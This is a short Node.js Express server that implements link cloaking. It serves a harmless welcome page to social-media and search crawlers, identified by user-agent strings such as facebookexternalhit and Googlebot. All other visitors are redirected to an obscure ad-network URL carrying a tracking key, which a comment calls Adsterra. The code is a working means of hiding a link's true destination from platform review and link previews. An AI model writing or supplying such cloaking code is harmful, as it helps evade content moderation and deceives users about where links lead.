const express = require("express");
const app = express();

// List of known Facebook bots
const botUserAgents = [
  "facebookexternalhit",
  "Facebot",
  "Twitterbot",
  "Pinterest",
  "WhatsApp",
  "Googlebot",
];

app.get("/", (req, res) => {
  const userAgent = req.headers["user-agent"] || "";

  if (botUserAgents.some((bot) => userAgent.includes(bot))) {
    // If it's a bot, show safe page
    res.send("<h1>Welcome to our website!</h1>");
  } else {
    // If it's a real user, redirect to Adsterra
    res.redirect("https://accountantflowerrespiration.com/g9axjbp9ui?key=e05757cf42dcf60c1cb27ebafb42876b");
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`)); // ✅ Backticks used
